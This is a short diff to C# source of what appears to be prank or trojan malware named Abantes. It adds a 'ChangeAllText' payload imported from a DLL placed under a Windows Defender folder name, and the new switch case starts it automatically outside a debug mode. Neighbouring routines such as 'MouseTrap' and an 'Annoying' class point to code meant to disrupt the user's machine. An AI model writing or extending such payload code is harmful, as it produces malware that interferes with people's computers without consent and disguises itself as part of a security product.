@@ -44,6 +44,8 @@ namespace Abantes.Payloads
         public static extern void Text();
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Flip@Payloads@1@QAEXXZ")]
         public static extern void Flip();
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?ChangeAllText@Payloads@1@QAEHXZ")]
+        public static extern void ChangeAllText();
         static Point Position;
         static Random _random = new Random();
         public static void MouseTrap()
@@ -479,6 +481,21 @@ namespace Abantes.Payloads
                         {
                             Thread text = new Thread(new ThreadStart(Annoying.Text));
                             text.Start();
+                        }
+                        break;
+                    case 12:
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START CHANGE ALL TEXT PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Thread CAT = new Thread(new ThreadStart(Annoying.ChangeAllText));
+                                CAT.Start();
+                            }
+                        }
+                        else
+                        {
+                            Thread CAT = new Thread(new ThreadStart(Annoying.ChangeAllText));
+                            CAT.Start();
                         }
                         break;
                 }
